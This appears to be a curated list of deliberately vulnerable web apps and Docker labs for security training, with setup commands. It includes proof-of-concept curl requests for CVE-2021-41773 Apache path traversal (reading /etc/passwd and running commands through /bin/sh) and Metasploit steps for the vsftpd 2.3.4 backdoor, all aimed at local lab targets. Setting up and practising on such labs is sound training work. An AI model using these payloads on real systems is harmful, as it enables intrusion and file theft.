## 0) [Awesome Vulnerable Applications](https://github.com/vavkamil/awesome-vulnerable-apps/tree/master#owasp-top-10)
## OWASP Top 10

- [Owasp Juice shop](https://github.com/bkimminich/juice-shop) - OWASP Juice Shop: Probably the most modern and sophisticated insecure web application
- [DVWA](https://github.com/ethicalhack3r/DVWA) - Damn Vulnerable Web Application (DVWA)
- [DSVW](https://github.com/stamparm/DSVW) - Damn Small Vulnerable Web
- [bWAPP](https://github.com/raesene/bWAPP) - This is just an instance of the OWASP bWAPP project as a docker container.
- [Xtreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa) - XVWA is a badly coded web application written in PHP/MySQL that helps security enthusiasts to learn application security.
- [lazyweb](https://github.com/RamadhanAmizudin/lazyweb) - This web application is a demonstration of common server-side application flaws. Each of the vulnerabilities has its own difficulty rating.
- [OWASP Mutillidae II](https://github.com/webpwnized/mutillidae) - OWASP Mutillidae II is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiast.
- [Pentest_lab](https://github.com/oliverwiegers/pentest_lab) - Local penetration testing lab using docker-compose.
- [VulnLab](https://github.com/Yavuzlar/VulnLab) - A vulnerable web application lab using Docker
- [WebGoat](https://github.com/WebGoat/WebGoat) - WebGoat is a deliberately insecure application by OWASP for training purpose
- [VAmPI](https://github.com/erev0s/VAmPI) - Vulnerable REST API with OWASP top 10 vulnerabilities for security testing

## 1) [vulhub](https://github.com/vulhub/vulhub) 
* Vulhub is an open-source collection of pre-built vulnerable docker environments. No pre-existing knowledge of docker is required, just execute two simple commands and you have a vulnerable environment.
#### Usage

```bash
# Download project
wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
unzip vulhub-master.zip
cd vulhub-master

# Enter the directory of vulnerability/environment
cd flask/ssti

# Compile environment
docker compose build

# Run environment
docker compose up -d
```
* [docs-with-notes](https://vulhub.org/#/docs/)

## 2) [DVWA](https://github.com/opsxcq/docker-vulnerable-dvwa)
* Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.
##### WARNING This image is vulnerable to several kinds of attacks, please don't deploy it to any public servers.

#### Usage 
```
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

## 3) [CVE-2021-41773](https://github.com/BlueTeamSteve/CVE-2021-41773)
* Vulnerable docker images for CVE-2021-41773 Apache path traversal 
#### Vulnerable file read config

Containers can be pulled directly from Docker Hub using

```docker pull blueteamsteve/cve-2021-41773:no-cgid```

and executed using

```docker run -dit -p 8080:80 blueteamsteve/cve-2021-41773:no-cgid```

The Apache logs can be viewed using below, or just exlude the "-dit" from the above run command to stream stdio
```docker logs <container-id>```

#### PoC for file read

```curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd```

#### Vulnerable RCE config

Containers can be pulled directly from Docker Hub using

```docker pull blueteamsteve/cve-2021-41773:with-cgid```

and executed using

```docker run -dit -p 8080:80 blueteamsteve/cve-2021-41773:with-cgid```

The Apache logs can be viewed using below, or just exlude the "-dit" from the above run command to stream stdio
```docker logs <container-id>```

#### PoC for RCE

```curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'```

#### Build custom docker containers

Modify and build your own versions using the dockerfile and template httpd.conf files in the subdirectories

- Use ./no-cgi for the config vulnerable to file read
- Use ./with-cgi for the config vulnerable to code execution

## 4) [pentest_lab](https://github.com/oliverwiegers/pentest_lab)
* This local pentest lab leverages docker compose to spin up multiple victim services and an attacker service running Kali Linux. If you run this lab for the first time it will take some time to download all the different docker images.

#### Usage 
### start the lab 
  ```
git clone https://github.com/oliverwiegers/pentest_lab
cd pentest_lab
./lab.sh -u
  ```
  ## 5) [vsftpd](https://github.com/clintmint/vsftpd-2.3.4-container)
* vulnerable version of vsftpd-2.3.4 for use in cybersecurity training environments. This module exploits a malicious backdoor that was added to the VSFTPD download archive. 
```
sudo docker run -d  --network host -p 2222:22 --name ssh-container brute-ssh:latest
```
```
git clone https://github.com/clintmint/vsftpd-2.3.4-container.git
cd vsftpd-2.3.4-container
docker build -t <docker-hub-username>/vsftpd-2.3.4:1.0 . --no-cache
docker run --name vsftpd-2.3.4 -it <docker-hub-username>/vsftpd-2.3.4:1.0 sh -c "start-vsftpd && sh"
```
* This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th, 2011 and July 1st, 2011 according to the most recent information available. This backdoor was removed on July 3rd, 2011.
```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit (unix/ftp/vsftpd_234_backdoor) > set rhost 192.168.1.103
msf exploit (unix/ftp/vsftpd_234_backdoor) > exploit
```
